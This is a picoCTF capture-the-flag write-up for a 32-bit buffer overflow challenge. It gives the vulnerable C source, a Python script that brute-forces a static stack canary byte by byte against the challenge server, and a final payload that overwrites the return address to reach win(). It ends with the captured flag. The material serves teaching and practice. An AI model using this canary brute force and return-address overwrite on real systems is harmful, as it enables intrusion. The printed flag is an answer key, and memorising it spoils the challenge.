**Description**

Author: Sanjay C / Palash Oswal

Do you think you can bypass the protection and get the flag?

Hints
(None)

**Tools**

This writeup is a continuation of the challenges [bufferoverflow0](./bufferoverflow0(100).md) and [bufferoverflow1](./bufferoverflow1(200).md) you may want to see these to gain insights into how a basic buffer overflow attack works. Reading the [bufferoverflow2](./bufferoverflow2(300).md) writeup may be helpful as well, though shouldn't be necessary for this writeup as it deals with function arguments which aren't relevant to this challenge.

In this writeup and subsequent binary exploitation writeups, I will be using the tools [Ghidra](https://github.com/NationalSecurityAgency/ghidra), [GDB](https://en.wikipedia.org/wiki/GNU_Debugger), and an extension for GDB called [pwndbg](https://github.com/pwndbg/pwndbg).
This tools together provide excellent static and dynamic analysis of a binary. 
Another tool to look at is radare2, however I did not use it for this writeup.
This competition is an excellent place to learn how to use these programs, however I will not be teaching them in entirety.

**Research**

Opening the source file gives us:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

Reading this code, we can see an aditional aspect to the challenge. Not only is there a function we need to jump into, but there is a [canary](https://en.wikipedia.org/wiki/Buffer_overflow_protection) that we need to deal with. This Canary protection is something new to the challenge, and is often an issue that those in real world scenarios need to deal with as a compiler will often add some sort of canary to variables in memory.

**Theory**

Now, what is a Canary? A canary protection, not the bird, is a type of buffer overflow protection method that detects if a buffer overflow has taken place. It is a place in memory often after your variable that detects if it is overwritten. Some canaries are only null bytes and it is a trivial bypass, however some are more complex. If you can know what the canary is, you can step around it by writing the same value to it as it had previously and then overwriting what you want to overwrite. The difficulty is finding what the canary is if it isn't ```0x00``` null bytes.

Not only is there a canary, but there looks to be multiple lines of input here. There is a thing that asks how many lines of input you want to enter. This doesn't seem to negate a buffer overflow however, if you tell it that you want to write more characters into the buffer than the buffer can accept it will still do that. However, later down the line as we want to start exploiting, our previous method of using a single line of python code to generate an input may need to be replaced with a more robust way to input data to a program.

**Input multiple lines**

To input multiple entries of data into a program, you can use an input file with the stored data. For example, if a program asks you for your first name, and then it asks you for your last name it you can feed it a file with each input on a seperate line. You can then use python to print to this file that you then feed to the program.

I.e
```python
print("1st input")
print("2nd input")
```

Then in the terminal you could type

```
python2 in.py > in.txt
```

Finally, you could pass that input file into your program

```
./program < in.txt
```

**Bypass canary**

This canary as seen in the program has a CANARY_SIZE of 4, this means that it is 4 characters or 4 bytes long. This could be 256^4=4294967296 possibilities. That number coudn't be brute forced. So, how do we do this? Remember the thing that asks how many characters you want to input? Well, we could enter the bytes of the canary one by one, couldn't we? If we overwrite only 1 byte of the canary, we can brute force that single byte individually without touching the rest which leaves our overflow undetected, and then move onto the next one. This input size number that we add could do this for us. This would make our number of possible tries down to 256\*4=1024 possibilites which is absolutely doable if automated.

Lets get the canary then with a python script
```python
import os

canary = ""
buffersize = 64

for i in range(0, 255):
  length = buffersize + len(canary) + 1
  string = "a"*buffersize + canary + chr(i)
  print(chr(i))
  
  with open("in", "w") as file:
    out = [str(length) + "\n", string + "\n"]
    file.writelines(out)
    
  os.system("nc saturn.picoctf.net 61528 < in")
```

If we run this the input that doesn't detect stack smashing is the next letter of the canary
Add this to the canary string, and then continue until you have all 4 characters in the canary

The canary I found was: ```BiRd```

**Exploit**

This is a very similar exploit to the [bufferoverflow1](./binary/bufferoverflow1(200).md) problem.

First, make in.py, the input length number doesn't matter anymore as we now have the canary

```python
print(200)
print("a"*64 + "BiRd")
```

Lets double check that this all works first

```python2 in.py > in```

```gdb vuln```

```r < in```

This shouldn't return any errors and exit normally.

It works, so lets continue.

Lets find where we need to enter to get into the win() by overwriting EIP

```
pwndbg> p *(win)
$1 = {<text variable, no debug info>} 0x8049336 <win>
```

win() is in ```0x8049336```

That offset turns out to have 16 bytes in between the canary and EIP.

Lets buld the exploit then

```python
print(200)
print("a"*64 + "BiRd" + "b"*16 + "\x36\x93\x04\x08")
```

```python2 in.py > in```

```gdb vuln```

```r < in```

It works, it gets us our test flag!

Testing it outside of gdb

```./vuln < in```

This works, lets continue to the server

```nc saturn.picoctf.net 61528 < in```

We have the flag!
It was: ```picoCTF{Stat1C_c4n4r13s_4R3_b4D_78734aff}```
